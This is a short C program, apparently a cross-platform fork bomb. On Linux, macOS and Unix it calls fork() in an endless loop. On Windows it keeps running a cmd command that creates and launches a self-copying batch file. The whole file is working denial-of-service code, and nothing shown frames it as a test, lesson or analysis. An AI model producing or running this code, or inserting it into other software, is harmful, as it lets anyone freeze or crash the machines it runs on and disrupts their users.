#include <stdio.h>

#ifdef _WIN32
   #include <stdlib.h>
#elif __APPLE__
    #include <unistd.h>
#elif __linux__
    #include <unistd.h>
#elif __unix__
    #include <unistd.h>
#endif

int main(void) {
	#ifdef __linux__
		while(1) {
			fork();
    	}
	#elif __APPLE__
    	while(1) {
        	fork();
    	}
	#elif __unix__
    	while(1) {
    		fork();
		}
	#elif _WIN32
    	const char *comando = "cmd /k echo -^|->-.bat&-";

		while(1) {
    		system(comando);
    	}
	#endif

	return 0;
}
